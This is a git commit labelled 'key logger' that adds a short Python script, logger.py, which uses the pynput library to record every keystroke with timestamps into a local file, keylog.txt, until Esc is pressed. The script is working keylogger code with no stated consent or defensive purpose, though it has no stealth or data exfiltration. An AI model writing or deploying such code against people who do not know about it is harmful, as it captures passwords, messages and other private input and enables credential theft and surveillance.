4ec5a043f3074e356f1adff8deccd7559bcf716d
mayank-dev07 <devmayank.hts@gmail.com>
2024-06-16 16:41:52 +0530

    key logger

---
+++ logger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+import logging
+
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def on_press(key):
+    try:
+        logging.info(f"Key {key.char} pressed")
+    except AttributeError:
+        logging.info(f"Special key {key} pressed")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
